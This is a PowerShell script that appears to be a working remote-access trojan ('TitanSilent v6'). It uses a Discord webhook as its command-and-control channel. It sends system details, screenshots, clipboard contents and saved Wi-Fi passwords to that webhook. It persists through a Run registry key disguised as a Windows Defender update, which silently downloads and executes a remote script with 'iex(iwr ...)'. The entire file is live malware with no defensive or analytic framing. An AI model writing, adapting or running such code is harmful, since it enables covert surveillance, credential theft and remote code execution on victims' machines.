$ErrorActionPreference = "SilentlyContinue"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$webhook = "https://discord.com/api/webhooks/1356723527486804138/8uoObVFzZbql8opsETphWlbiXPSbYSZOgSW9mxfx_-A4olDcCGD3FQvslxUJ4UjvCE_L"

function Send-Discord($msg) {
    $json = @{content = $msg} | ConvertTo-Json -Depth 3
    Invoke-RestMethod -Uri $webhook -Method POST -Body $json -ContentType 'application/json'
}

function Send-Screenshot {
    $file = "$env:TEMP\titanshot.png"
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $bitmap.Save($file, [System.Drawing.Imaging.ImageFormat]::Png)

    Invoke-RestMethod -Uri $webhook -Method Post -InFile $file -ContentType 'multipart/form-data'
    Remove-Item $file -Force
}

function Listen-Discord {
    while ($true) {
        Start-Sleep -Seconds 10
        $response = Invoke-RestMethod -Uri $webhook -Method Get
        $latestMessage = $response[-1].content.ToLower()

        switch ($latestMessage) {
            "!screenshot" {
                Send-Screenshot
            }
            "!info" {
                Send-FullInfo
            }
            "!clipboard" {
                $clip = Get-Clipboard
                if ($clip -eq "") { $clip = "[Empty]" }
                Send-Discord "📋 Clipboard: $clip"
            }
            "!wifi" {
                Send-Wifi
            }
            "!exit" {
                exit
            }
        }
    }
}

function Send-Wifi {
    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
    $wifi = ""
    foreach ($p in $profiles) {
        $pw = netsh wlan show profile name="$p" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
        $wifi += "`n$p → $pw"
    }
    Send-Discord "📡 WLANs:$wifi"
}

function Send-FullInfo {
    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
    $uname = $env:USERNAME
    $pc = $env:COMPUTERNAME
    $os = (Get-CimInstance Win32_OperatingSystem).Caption
    $av = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntivirusProduct" | Select-Object -ExpandProperty displayName -ErrorAction SilentlyContinue
    if (!$av) { $av = "None Detected" }

    $msg = "**[TitanSilent v6 – C2 Mode]**`n👤 User: $uname`n🖥️ PC: $pc`n💿 OS: $os`n🌐 IP: $ip`n🛡️ AV: $av"
    Send-Discord $msg
}

# Persistenz
$target = "$env:APPDATA\WindowsDefender.ps1"
if (!(Test-Path $target)) {
    Copy-Item -Path $PSCommandPath -Destination $target -Force
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DefenderUpdate" /d "powershell -w hidden -ep bypass -c iex(iwr -UseBasicParsing 'https://raw.githubusercontent.com/titanxrio/ps1/main/v5.ps1')" /f
}

# Initial send
Send-FullInfo

# Start listening for Discord Commands
Listen-Discord
